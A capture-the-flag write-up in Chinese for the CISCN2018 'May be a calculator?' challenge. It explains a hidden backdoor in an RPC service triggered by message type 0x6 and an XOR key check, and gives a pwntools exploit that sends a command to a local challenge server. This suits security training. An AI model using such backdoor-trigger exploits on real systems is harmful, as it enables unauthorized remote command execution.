# CISCN2018 : May be a calculator?

## **[Principle]**
backdoor

## **[Environment]**
Ubuntu

## **[Tools]**
gdb、objdump、python、pwntools

## **[Process]**

考察RPC相关协议及预留后门，通过逆向代码逻辑可以看到在符合type为0x6时，隐藏了一个后门，在后门函数中首先对接收到的key进行检查，通过将加密后的key（加密算法为简单的异或）和一个固定字符串进行比较，相等则接收真正的payload，加密算法如下：

	void encrypt(char* key)
	{
	  int i;
	  int k=0;
	  for(i=0;i<36;i++)
	  {
	    key[i]=(key[i]^k)%256;
	    k+=23;
	  }
	}

最终脚本如下：
exp.py

	from pwn import *
	import os
	payload="cat flag"
	key="12345678-6666-2333-5555-deadbeef1234"
	backdoor=b'RPCM\x00\x00\x00\x0c\x00\x00\x00\x06'+p32(len(key))[::-1]+key+p32(len(payload))[::-1]+payload
	r = remote('127.0.0.1', 1337)
	r.sendline(backdoor)
	print r.recvline()
	r.close()

